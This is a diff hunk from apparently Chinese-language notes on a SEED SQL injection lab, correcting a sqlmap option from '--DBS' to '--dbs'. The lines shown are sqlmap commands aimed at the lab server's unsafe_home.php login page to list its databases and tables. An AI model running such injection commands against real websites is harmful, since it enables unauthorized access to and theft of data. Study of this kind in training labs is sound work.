@@ -1222,7 +1222,7 @@ mysql&gt; show tables;
 sqlmap -u &quot;http://www.seed-server.com/unsafe_home.php?username=admin&amp;Password=&quot; 
 
 //读取某个url用到的数据库系统中存在的数据库名称
-sqlmap -u &quot;http://www.seed-server.com/unsafe_home.php?username=admin&amp;Password=&quot; --DBS
+sqlmap -u &quot;http://www.seed-server.com/unsafe_home.php?username=admin&amp;Password=&quot; --dbs
 
 //读取某个数据库中的所有表
 sqlmap -u &quot;http://www.seed-server.com/unsafe_home.php?username=admin&amp;Password=&quot; -D 数据库名 --tables
